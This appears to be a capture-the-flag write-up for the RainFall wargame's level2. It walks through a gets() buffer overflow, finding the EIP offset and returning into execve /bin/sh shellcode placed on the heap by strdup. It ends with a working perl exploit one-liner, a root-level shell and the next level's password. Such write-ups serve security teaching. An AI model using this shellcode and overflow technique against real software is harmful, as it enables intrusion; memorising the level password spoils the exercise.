### Analysis

**In `main` :**
Just a call to function `p()`

**In `p()` :**
call to `gets` which is vunerable to overflow
There is a protection afterward to check if `eip` doesn't get overwritten by an adress from the stack
we cannot use the stack but thanks to `strdup` we can use the heap

Adress of the allocated memory by strdup on the heap is `0x0804a008`
```
level2@RainFall:~$ echo "42" | ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
...
strdup("42")                = 0x0804a008
+++ exited (status 8) +++
```

___

### Exploit

Determine the offset of `eip` => 80
```
 ❯ python3 offset.py   
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

(gdb) r
Starting program: /home/user/level2/level2
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

 ❯ python3 offset.py 55
80
```

We'll write a shellcode on the heap with `strdup`
and overwite `eip` to its adress

So the end buffer is:
 - shellcode (45 bytes)
 - NOP instructions (35 characters)
 - address allocated by strdup (4 bytes)
```
level2@RainFall:~$ perl -e 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x90" x 35 . "\x08\xa0\x04\x08\n"' > /tmp/level2 && cat /tmp/level2 - | ./level2
�^�1��F�F
          �
           ���V
               ̀1ۉ�@̀�����/bin/sh�������������������������������
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```